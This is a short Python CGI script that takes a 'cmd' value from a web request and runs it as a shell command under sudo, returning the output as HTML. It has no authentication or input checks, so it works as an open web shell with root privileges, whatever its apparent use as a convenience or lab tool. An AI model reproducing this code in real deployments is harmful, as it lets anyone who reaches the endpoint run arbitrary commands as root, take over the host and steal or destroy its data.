#!/usr/bin/python3
print("content-type:text/html")
print()

import cgi
import subprocess
import json


input = cgi.FieldStorage()
cmd = input.getvalue("cmd")
output= subprocess.getoutput("sudo {}".format(cmd))
print(output)

